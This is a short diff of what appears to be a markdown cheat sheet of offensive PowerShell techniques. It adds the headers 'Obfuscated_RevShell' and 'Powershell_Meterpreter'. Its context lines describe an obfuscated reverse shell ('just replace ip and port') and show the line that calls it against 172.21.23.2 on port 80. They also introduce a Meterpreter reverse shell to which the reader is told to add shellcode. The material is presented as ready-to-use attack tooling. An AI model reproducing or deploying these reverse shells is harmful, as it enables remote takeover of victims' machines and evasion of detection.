@@ -1187,6 +1187,8 @@ $string = $null}} else {cleanup}}
 <br>
 <br>
 
+### Obfuscated_RevShell
+
 - A better powershell rev shell... just replace ip and port at the bottom
 
 ```powershell
@@ -1261,6 +1263,9 @@ function _/=\/==\_/==\_____
 }
 _/=\/==\_/==\_____ -__/\/\/=\_/\/\____ -__/==\/=\_/==\/==\ 172.21.23.2 -__/====\/\___/=\/\ 80
 ```
+<br>
+
+### Powershell_Meterpreter
 
 - A even better shell
 - Rev meterpreter shell with powershell, just replace shellcode
